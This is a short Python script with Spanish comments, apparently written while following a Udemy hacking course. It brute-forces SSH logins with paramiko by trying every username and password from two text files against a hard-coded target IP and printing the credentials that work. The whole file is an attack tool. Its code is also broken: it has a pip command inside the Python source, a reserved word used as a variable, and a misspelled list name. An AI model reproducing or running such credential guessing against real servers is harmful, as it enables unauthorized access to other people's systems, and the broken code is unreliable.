"""
Basado https://www.udemy.com/course/python-de-0-hasta-hacking/learn/lecture/12050338#overview

tenemos un txt con ususarios y otro con contraseñas a probar

"""

#!/usr/bin/env python
#_*_ coding: utf8 _*_
pip install paramiko
import paramiko
import time

def brute(host,puerto,usuario,password):
    log = paramiko.util.log_to_file('registro.log')
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cliente.connect(host,port=puerto,username=usuario,password=password)
        print('Credenciales que funcionaron {}:{}'.format(usuario,password))
    except:
        print('Fallo el intento')


def main():
    ip = '192.168.0.1' #ip objetivo
    puerto = 22
    usuarios = open('usuarios.txt','r')
    usuarios = usuarios.read().split('\n') #q ignore los saltos de linea
    passwords = open('passwords.txt','r')
    passwords = passwords.read().split('\n') #q ignore los saltos de linea

    for user in ususarios:
        for pass in passwords:
            time.sleep(3)
            brute(ip,puerto,user,pass)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()